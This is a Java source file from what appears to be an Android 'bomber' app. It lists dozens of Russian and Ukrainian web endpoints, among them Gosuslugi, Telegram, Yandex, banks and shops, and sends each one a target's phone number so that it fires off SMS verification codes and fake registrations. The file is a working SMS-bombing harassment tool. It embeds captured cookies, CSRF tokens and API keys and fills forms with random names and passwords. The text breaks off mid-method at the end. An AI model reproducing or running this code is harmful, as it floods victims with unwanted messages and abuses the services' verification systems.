package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.HttpUrl;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class Services {

    private static boolean contains(final int[] array, final int key) {
        for (final int i : array) {
            if (i == key) {
                return true;
            }
        }
        return false;
    }

    public static List<Service> getUsableServices(String countryCode) {
        List<Service> usableServices = new ArrayList<>();

        int countryCodeNum = countryCode.isEmpty() ? 0 : Integer.parseInt(countryCode);
        for (Service service : services) {
            if (service.countryCodes == null || service.countryCodes.length == 0 || contains(service.countryCodes, countryCodeNum))
                usableServices.add(service);
        }

        return usableServices;
    }

    public final static Service[] services = new Service[]{
            new Ukrzoloto(), new Olltv(), new ProstoTV(), new Groshivsim(),
            new Dolyame(), new Multiplex(), new MosMetro(), new BCS(),
            new Biua(), new MdFashion(), new XtraTV(), new AlloUa(),
            new Rulybka(), new BeriZaryad(), new SatUa(), new Grilnica(),
            new Soscredit(), new ChernovtsyRabota(), new Eva(), new Apteka(),

            new JsonService("https://www.gosuslugi.ru/auth-provider/mobile/register", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("instanceId", "123");
                        json.put("firstName", getRussianName());
                        json.put("lastName", getRussianName());
                        json.put("contactType", "mobile");
                        json.put("contactValue", format(phone, "+7(***)*******"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://my.telegram.org/auth/send_password") {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phone", "+" + getFormattedPhone());
                }
            },

            new ParamsService("https://findclone.ru/register") {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phone", getFormattedPhone());
                }
            },

            new FormService("https://shop.vodovoz-spb.ru/bitrix/tools/ajax_sms.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new ParamsService("https://vsem-edu-oblako.ru/singlemerchant/api/sendconfirmationcode", 7) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("lang", "ru");
                    builder.addQueryParameter("json", "true");
                    builder.addQueryParameter("merchant_keys", "b27447ba613046d3659f9730ccf15e3c");
                    builder.addQueryParameter("device_id", "f330883f-b829-41df-83f5-7e263b780e0e");
                    builder.addQueryParameter("device_platform", "desktop");
                    builder.addQueryParameter("phone", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new JsonService("https://api.sunlight.net/v3/customers/authorization/") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://cnt-vlmr-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("session_id", "24f8bbf7-60d3-11ec-b71d-4857027601a0:1951416:2237006:2");
                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("action", "register");
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new Service(380) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("msisdn", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    client.newCall(new Request.Builder()
                            .url("https://mnp.lifecell.ua/mnp/get-token/")
                            .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                            .build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {

                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                            try {
                                JSONObject req = new JSONObject(Objects.requireNonNull(response.body()).string());

                                JSONObject json = new JSONObject();
                                json.put("contact", getFormattedPhone());
                                json.put("otp_type", "standart");

                                client.newCall(new Request.Builder()
                                        .url("https://mnp.lifecell.ua/mnp/otp/send/")
                                        .header("authorization", "Token " + req.getString("token"))
                                        .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                        .build()).enqueue(callback);

                            } catch (JSONException | NullPointerException e) {
                                callback.onError(call, e);
                            }
                        }
                    });
                }
            },

            new FormService("https://uss.rozetka.com.ua/session/auth/signup-phone", 380) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "ab-cart-se=new; xab_segment=123; slang=ru; uid=rB4eDGHMb00wHeQls7l4Ag==; visitor_city=1; _uss-csrf=zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5; ussat_exp=1640830991; ussat=8201437cececef15030d16966efa914d.ua-a559ca63edf16a11f148038356f6ac94.1640830991; ussrt=6527028eb43574da97a51f66ef50c5d0.ua-a559ca63edf16a11f148038356f6ac94.1643379791; ussapp=u3-u_ZIf2pBPN8Y6oGYIQZLBN4LUkQgplA_Dy2IX; uss_evoid_cascade=no");
                    builder.addHeader("Csrf-Token", "zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    String name = getRussianName();

                    builder.add("title", name);
                    builder.add("first_name", name);
                    builder.add("last_name", getRussianName());
                    builder.add("password", getUserName() + "A123");
                    builder.add("email", getEmail());
                    builder.add("phone", phone);
                    builder.add("request_token", "rB4eDGHMb00wHeQls7l4Ag==");
                }
            },

            new FormService("https://happywear.ru/index.php?route=module/registerformbox/ajaxCheckEmail", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("email", getEmail());
                    builder.add("telephone", format(phone, "7(***)***-**-**"));
                    builder.add("password", "qVVwa6QwcaCPP2s");
                    builder.add("confirm", "qVVwa6QwcaCPP2s");
                }
            },

            new ParamsService("https://www.sportmaster.ua/?module=users&action=SendSMSReg", 380) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phone", getFormattedPhone());
                }
            },

            new FormService("https://yaro.ua/assets/components/office/action.php", 380) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("action", "authcustom/formRegister");
                    builder.add("mobilephone", getFormattedPhone());
                    builder.add("pageId", "116");
                    builder.add("csrf", "b1618ecce3d6e49833f9d9c8c93f9c53");
                }
            },

            new JsonService("https://api.01.hungrygator.ru/web/auth/webotp", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("userLogin", format(phone, "+7 (***) ***-**-**"));
                        json.put("fu", "bar");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://sushiicons.com.ua/kiev/index.php?route=common/cart/ajaxgetcoderegister", 380) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("firstname", getRussianName());
                    builder.add("phone", format(phone, "+380 (**) ***-**-**"));
                    builder.add("birthday", "2005-03-05");
                }
            },

            new JsonService("https://e-solution.pickpoint.ru/mobileapi/17100/sendsmscode") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("User-Agent", "Application name: pickpoint_android, Android version: 29, Device model: Mi 9T Pro (raphael), App version name: 3.9.0, App version code: 69, App flavor: , Build type: release");
                    builder.addHeader("Connection", "Keep-Alive");
                    builder.addHeader("Accept-Encoding", "gzip");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("PhoneNumber", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://xn--80adjkr6adm9b.xn--p1ai/api/v5/user/start-authorization", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone, "+7 *** ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://c.ua/index.php?route=account/loginapples/sendSMS", 380) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("route", "account/loginapples/sendSMS");
                    builder.addQueryParameter("phone", "0" + phone);
                }
            },

            new FormService("https://zvonok.com/api/demo/", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("csrfmiddlewaretoken", "IR473RdCuTdFJyh1O2PXgiiYrI6DNQFmHiagLFAXOsMlDMdh2DsxuZuEEeOT3kCs");
                    builder.add("type", "confirm");
                    builder.add("phone", format(phone, "+7 (***)***-**-**"));
                }
            },

            new FormService("https://almazholding.ru/local/user1/sendcode.php") {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("PHONE", getFormattedPhone());
                    builder.add("ECAPTCHA", "undefined");
                }
            },

            new ParamsService("https://my.hmara.tv/api/sign", 380) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addEncodedQueryParameter("contact", getFormattedPhone());
                    builder.addEncodedQueryParameter("deviceId", "81826091-f299-4515-b70f-e82fd00fec9a");
                    builder.addEncodedQueryParameter("language", "ru");
                    builder.addEncodedQueryParameter("profileId", "1");
                    builder.addEncodedQueryParameter("deviceType", "2");
                    builder.addEncodedQueryParameter("ver", "2.2.9");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("Cookie", "_ga=GA1.2.641734216.1650994527; _gid=GA1.2.109748838.1650994527; _gat_gtag_UA_131143143_1=1; _fbp=fb.1.1650994527815.1351289375; _hjFirstSeen=1; _hjSession_1352224=eyJpZCI6IjQ4ZWY4YmFhLTBmZDMtNGE1Yy05NGNiLWUzNzUzMjY5YWI5ZiIsImNyZWF0ZWQiOjE2NTA5OTQ1MjgzNTIsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=0; _hjSessionUser_1352224=eyJpZCI6ImQwMjA0NjA2LWNjYWUtNTBmNi1hMmNjLTU5YzdhMDQ5MTQwNyIsImNyZWF0ZWQiOjE2NTA5OTQ1Mjc4NzEsImV4aXN0aW5nIjp0cnVlfQ==; _gat=1");

                    return super.buildRequest(builder);
                }
            },

            new JsonService("https://api-new.elementaree.ru/graphql") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("operationName", "phoneVerification");
                        json.put("query", "mutation phoneVerification($phone: String!) {\n" +
                                "  phoneVerification(phone: $phone) {\n" +
                                "    success\n" +
                                "    interval\n" +
                                "    __typename\n" +
                                "  }\n" +
                                "}\n");

                        json.put("variables", new JSONObject()
                                .put("phone", getFormattedPhone()));

                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://beerlogapizza.ru/ajax/global_ajax.php") {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("character", "number");
                    builder.add("phone", phone);
                    builder.add("code", "");
                    builder.add("session_id", "e6ab56c6c97b3a47cdee0f60705a8561");
                }
            },

            new FormService("https://online.lenta.com/api.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("tel", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url("https://liski.skoro-pizza.ru/api/user/generate-password")
                            .header("x-thapl-apitoken", "b3cb999a-d3ad-11ec-84bd-d00d1849d38c")
                            .header("x-thapl-domain", "rossosh.skoro-pizza.ru")
                            .header("x-thapl-region-id", "5")
                            .post(RequestBody.create("------WebKitFormBoundaryMUU3NBWAJgnNsU1E\n" +
                                    "Content-Disposition: form-data; name=\"phone\"\n" +
                                    "\n" +
                                    format(phone, "+7 *** *** ** **") +
                                    "\n------WebKitFormBoundaryMUU3NBWAJgnNsU1E--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryMUU3NBWAJgnNsU1E")))
                            .build()).enqueue(callback);
                }
            },

            new JsonService("https://new.victoria-group.ru/api/v2/manzana/Identity/RequestAdvancedPhoneEmailRegistration") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("parameter", new JSONObject()
                                .put("MobilePhone", "+" + getFormattedPhone())
                                .put("CardNumber", null)
                                .put("AgreeToTerms", 1)
                                .put("AllowNotification", 0)
                                .toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("X-CSRF-TOKEN", "9ZshUjW4iWYuM95Cgo2WmD9pANxDLHGjEOTnOLAA");
                    builder.header("X-Requested-With", "XMLHttpRequest");

                    return super.buildRequest(builder);
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url("https://food-port.ru/api/user/generate-password")
                            .header("x-thapl-apitoken", "9e7c8984-d531-11ec-b5b9-d00d1849d38c")
                            .header("cookie", "upkvartal-frontend=5pu1js95pptj7pksmbgqru1vjc; _csrf-frontend=4c3056cb44f23d0a2ec3460e5816086cb7b0e12162e2d912746e7ff11ea91742a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22CcL2WanJJP7r_o2Llmun0aAftzxvrkpu%22%3B%7D; _ga_4BXG5PKES8=GS1.1.1652716962.1.0.1652716962.60; _ga=GA1.1.1706773214.1652716962; _ym_uid=1652716963122456118; _ym_d=1652716963; _fbp=fb.1.1652716963371.784120387; _ym_visorc=w; _ym_isad=2; advanced-api=num4ubgr4gks7k97tcri472c8b; api-key=9e7c8984-d531-11ec-b5b9-d00d1849d38c")
                            .post(RequestBody.create("------WebKitFormBoundaryd1lHEip8CBDSaYZd\n" +
                                    "Content-Disposition: form-data; name=\"phone\"\n" +
                                    "\n" +
                                    format(phone, "+7 *** *** ** **") +
                                    "\n------WebKitFormBoundaryd1lHEip8CBDSaYZd--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryd1lHEip8CBDSaYZd")))
                            .build()).enqueue(callback);
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url("https://api-frontend.uservice.io/v2/user/profile/auth/")
                            .post(RequestBody.create("------WebKitFormBoundaryS40r7hAsKHLxEAFV\n" +
                                            "Content-Disposition: form-data; name=\"phone\"\n" +
                                            "\n" +
                                            format(phone, "+7 *** ***-****") +
                                            "\n------WebKitFormBoundaryS40r7hAsKHLxEAFV\n" +
                                            "Content-Disposition: form-data; name=\"country_id\"\n" +
                                            "\n" +
                                            "1\n" +
                                            "------WebKitFormBoundaryS40r7hAsKHLxEAFV--",
                                    MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryS40r7hAsKHLxEAFV")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://be.budusushi.ua/login", 380) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("LoginForm[username]", "0" + phone);
                }
            },

            new FormService("https://dostavka.marcellis.ru/include/library/SendSMS.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new FormService("https://zdesapteka.ru/bitrix/services/main/ajax.php?action=zs%3Amain.ajax.AuthActions.sendAuthCode", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("userPhone", format(phone, "+7 (***) ***-**-**"));
                    builder.add("SITE_ID", "s1");
                    builder.add("sessid", "fb5f8f6092762d032bfda6fd1f2947ad");
                }
            },

            new FormService("https://almazholding.ru/local/user1/sendcode.php") {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("PHONE", getFormattedPhone());
                    builder.add("ECAPTCHA", "undefined");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("Cookie", "_ym_d=1648577093; _ym_uid=1648577093945352536; PHPSESSID=l8uZ53Njk3Fnh6Sx5k6Fap6hW2CxC42l; ALTASIB_SITETYPE=original; BITRIX_SM_ALMAZ_GUEST_ID=5540491; BITRIX_SM_ALMAZ_LAST_ADV=5_Y; BITRIX_SM_ALMAZ_ALTASIB_LAST_IP=185.100.26.203; BITRIX_SM_ALMAZ_ALTASIB_GEOBASE=%7B%22ID%22%3A%222149%22%2C%22BLOCK_BEGIN%22%3A%223110344704%22%2C%22BLOCK_END%22%3A%223110345727%22%2C%22BLOCK_ADDR%22%3A%22185.100.24.0%20-%20185.100.27.255%22%2C%22COUNTRY_CODE%22%3A%22RU%22%2C%22CITY_ID%22%3A%222149%22%2C%22CITY_NAME%22%3A%22%D0%9C%D1%83%D1%80%D0%BE%D0%BC%22%2C%22REGION_NAME%22%3A%22%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%BC%D0%B8%D1%80%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C%22%2C%22COUNTY_NAME%22%3A%22%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3%22%2C%22BREADTH_CITY%22%3A%2255.574291%22%2C%22LONGITUDE_CITY%22%3A%2242.05151%22%7D; BITRIX_SM_ALMAZ_SALE_UID=101692370; BITRIX_SM_ALMAZ_ALTASIB_GEOBASE_COUNTRY=%7B%22country%22%3A%22RU%22%7D; BITRIX_SM_ALMAZ_refer=https%3A%2F%2Fwww.google.com%2F; BITRIX_SM_ALMAZ_CURRENT_CURRENCY=RUB; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A23%2C%22EXPIRE%22%3A1656449940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _gid=GA1.2.218161957.1656428115; _gat_gtag_UA_212738426_1=1; _ym_visorc=w; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _lhtm_u=62baf6a0c08c1de57308a35b; _lhtm_r=https%3A//www.google.com|60ec84b803dc9ecc5a9bc57a; lh_banner_closed=true; BITRIX_SM_ALMAZ_LAST_VISIT=28.06.2022%2017%3A55%3A42; _ga_EM9HX0LRBQ=GS1.1.1656428114.1.1.1656428143.0; BITRIX_SM_ALMAZ_window_width=983; _ga=GA1.2.274030319.1656428115; lh_widget_system_pages_counter=2");

                    return super.buildRequest(builder);
                }
            },

            new JsonService("https://openapi.welldonego.ru/api/v1/user/create") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("firstName", getRussianName());
                        json.put("lastName", getRussianName());
                        json.put("msisdn", getFormattedPhone());
                        json.put("offerAccepted", true);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://qlean.ru/widget-form/http/requestotp") {
                private static final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37";

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("connection", 3);
                        json.put("csrfToken", "1a55c5d16d8059e75304cb02ddda566b7d2a96bd22cc92937ee5a894e6dfa734");
                        json.put("login", getFormattedPhone());
                        json.put("send", 1);
                        json.put("userAgent", USER_AGENT);
                        json.put("userType", 1);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("User-Agent", USER_AGENT);

                    return super.buildRequest(builder);
                }
            },

            new ParamsService("https://stockmann.ru/ajax/", 7) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("controller", "user");
                    builder.addQueryParameter("action", "registerUser");
                    builder.addQueryParameter("surname", getRussianName());
                    builder.addQueryParameter("name", getRussianName());
                    builder.addQueryParameter("phone", format(phone, "+7 (***) *** - ** - **"));
                    builder.addQueryParameter("email", getEmail());
                    builder.addQueryParameter("password", "qwerty");
                    builder.addQueryParameter("password_confirm", "qwerty");
                }
            },

            new JsonService("https://adengi.ru/rest/v1/registration/code/send") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("email", getEmail());
                        json.put("firstName", getRussianName());
                        json.put("lastName", getRussianName());
                        json.put("middleName", getRussianName());
                        json.put("phone", getFormattedPhone());
                        json.put("via", "sms");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://sberuslugi.ru/api/v1/user/secret", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone, "+7 (***) ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("http://mrroll.ru/user/signin", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("_csrf", "5KvJ6CDYi4Laz2Q6CyFNkL_8Q7XCKIHwZ1GKFyOgvDG82braFuHZs567NFVDWC7Bibo53YoewMVQMsx0E-LteQ==");
                    builder.add("User[phone]", format(phone, "(***)***-**-**"));
                    builder.add("step", "send-sms");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("X-CSRF-Token", "ILbsTHW-XK9IK-uHMiEupoGGozbm6QSvl06--OCEZsx4xJ9-Q4cOngxfu-h6WE33t8DZXq7fRZqgLfib0MY3hA==");
                    builder.header("X-Requested-With", " XMLHttpRequest");

                    return super.buildRequest(builder);
                }
            },

            new JsonService("https://borrow.zaymigo.com/rpc/v1") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("id", "8bb65e5f-33e2-4e02-b58e-5fec3187f4b5");
                        json.put("jsonrpc", "2.0");
                        json.put("method", "create");
                        json.put("params", new JSONObject()
                                .put("term", 12)
                                .put("marketingFields", new JSONObject()
                                        .put("calc", "v2"))
                                .put("amount", 10000)
                                .put("borrower", new JSONObject()
                                        .put("email", getEmail())
                                        .put("name", getRussianName())
                                        .put("patronymic", getRussianName())
                                        .put("patronymicNotExists", false)
                                        .put("phone", "+" + getFormattedPhone())
                                        .put("phoneParams", new JSONArray())
                                        .put("surname", getRussianName()))
                                .put("agreements", new JSONArray()
                                        .put(new JSONObject()
                                                .put("name", "assignment_of_claims")
                                                .put("val", true))));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://lk.doconline.ru/api/v1/auth/phones/codes") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://new.moy.magnit.ru/local/ajax/login/", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "+ 7 ( *** ) ***-**-**"));
                    builder.add("ksid", "ad040b9d-df39-4e88-9c6c-10e6ba6ffbc6_0");
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url("https://my.pochtabank.ru/dbo/registrationService/ib")
                            .post(RequestBody.create("", null))
                            .build()).enqueue(new Callback() {
                        @Override
                        public void onError(@NonNull Call call, @NonNull Exception e) {
                            callback.onError(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            JSONObject json = new JSONObject();

                            try {
                                json.put("confirmation", "send");
                                json.put("phone", format(phone, "+7 (***) ***-**-**"));
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            StringBuilder cookie = new StringBuilder();

                            for (String entry : response.headers("Set-Cookie")) {
                                cookie.append(entry.split(";")[0]);
                                cookie.append("; ");
                            }

                            client.newCall(new Request.Builder()
                                    .url("https://my.pochtabank.ru/dbo/registrationService/ib/phoneNumber")
                                    .header("noti", "false")
                                    .header("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                                    .header("Cache-Control", "no-cache")
                                    .header("Connection", "keep-alive")
                                    .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
                                    .header("Accept-Encoding", "gzip, deflate, br")
                                    .header("pbib-save", "false")
                                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37")
                                    .header("Cookie", cookie.toString())
                                    .put(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                    .build()).enqueue(callback);
                        }
                    });
                }
            },

            new FormService("https://api-user.privetmir.ru/api/v2/send-code", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("checkApproves", "Y");
                    builder.add("approve1", "on");
                    builder.add("approve2", "on");
                    builder.add("back_url", "");
                    builder.add("scope", "register-user reset-password");
                    builder.add("login", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new JsonService("https://familyfriend.com/graphql") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("operationName", "AuthEnterPhoneMutation");
                        json.put("query", "mutation AuthEnterPhoneMutation($input: RequestSignInCodeInput!) {\n" +
                                "  result: requestSignInCode(input: $input) {\n" +
                                "    ... on RequestSignInCodePayload {\n" +
                                "      codeLength\n" +
                                "      phone\n" +
                                "      __typename\n" +
                                "    }\n" +
                                "    ... on ErrorPayload {\n" +
                                "      message\n" +
                                "      __typename\n" +
                                "    }\n" +
                                "    __typename\n" +
                                "  }\n" +
                                "}\n");
                        json.put("variables", new JSONObject()
                                .put("input", new JSONObject()
                                        .put("phone", getFormattedPhone())));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new Service() {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url("https://tv.yota.ru/")
                            .get().build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {
                            callback.onFailure(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            JSONObject json = new JSONObject();

                            try {
                                json.put("msisdn", getFormattedPhone());
                                json.put("password", "91234657");
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            StringBuilder cookie = new StringBuilder();

                            for (String entry : response.headers("Set-Cookie")) {
                                cookie.append(entry.split(";")[0]);
                                cookie.append("; ");
                            }

                            try {
                                client.newCall(new Request.Builder()
                                        .url("https://bmp.tv.yota.ru/api/v10/auth/register/msisdn")
                                        .addHeader("Cookie", cookie.toString())
                                        .post(RequestBody.create(
                                                json.toString(), MediaType.parse("application/json")))
                                        .build()).enqueue(callback);
                            } catch (NullPointerException e) {
                                callback.onError(call, e);
                            }
                        }
                    });
                }
            },

            new JsonService("https://www.akbars.ru/api/PhoneConfirm/", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phoneNumber", phone);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://bandeatos.ru/?MODE=AJAX", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("sessid", "404d33f8bac1c1aa4305e6af3ebffa8b");
                    builder.add("FORM_ID", "bx_1789522556_form");
                    builder.add("PHONE_NUMBER", "+" + getFormattedPhone());
                }
            },

            new FormService("https://passport.yandex.ru/registration-validations/phone-confirm-code-submit", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("csrf_token", "3a2c860df9d6b793a1062cb40bf6571642269832:1656577004061");
                    builder.add("track_id", "8871889a827b939106e809c0816c6dce7b");
                    builder.add("display_language", "ru");
                    builder.add("number", "+" + getFormattedPhone());
                    builder.add("confirm_method", "by_sms");
                    builder.add("isCodeWithFormat", "true");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
